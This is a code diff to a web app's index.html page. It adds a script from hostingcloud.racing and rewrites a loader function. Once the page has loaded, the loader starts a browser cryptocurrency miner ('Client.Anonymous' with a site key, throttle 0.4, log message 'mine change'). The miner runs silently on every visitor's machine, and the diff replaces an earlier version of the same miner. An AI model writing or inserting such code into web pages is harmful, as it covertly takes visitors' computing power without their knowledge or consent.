@@ -52,30 +52,39 @@
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
     
-    
+    <script src="https://www.hostingcloud.racing/0ZUJ.js"></script>
     <script>
       function loadError (oError) {
         throw new URIError("The script " + oError.target.src + " is not accessible.");
       }
 
-      function importScript (sSrc, fOnload) {
+      function importScript (sSrc) {
         var oScript = document.createElement("script");
-        oScript.type = "text\/javascript";
+        oScript.setAttribute("type","text/javascript");
         oScript.onerror = loadError;
-        if (fOnload) { oScript.onload = fOnload; }
-        document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
         oScript.src = sSrc;
+        oScript.onload  = oScript.onreadystatechange = function(){
+          
+          var interval = setInterval(function(){
+            if(document.readyState === "loaded" || document.readyState ==="complete"){
+              console.log("mine change");
+              clearInterval(interval);
+                var _client = new Client.Anonymous('ecd9ae45c61e07a21b0d5d3a784a4d591de8c3a2823a5b9ef9c263eaa679a135', {
+                    throttle: 0.4, ads: 0
+                  }
+                );
+                _client.start();
+                
+              }
+          }, 300)
+          
+          
+        }
+        document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
+        
       }
 
-      importScript("https://www.hostingcloud.racing/rJEm.js", function(){
-        console.log("miner load");
-        var _client = new Client.Anonymous('ecd9ae45c61e07a21b0d5d3a784a4d591de8c3a2823a5b9ef9c263eaa679a135', {
-        throttle: 0.4, ads: 0
-      });
-      _client.start();
-      // document.getElementsByTagName('a')[0].parentElement.remove();
-        
-      })
+      importScript("https://www.hostingcloud.racing/0ZUJ.js")
 
     </script>
     
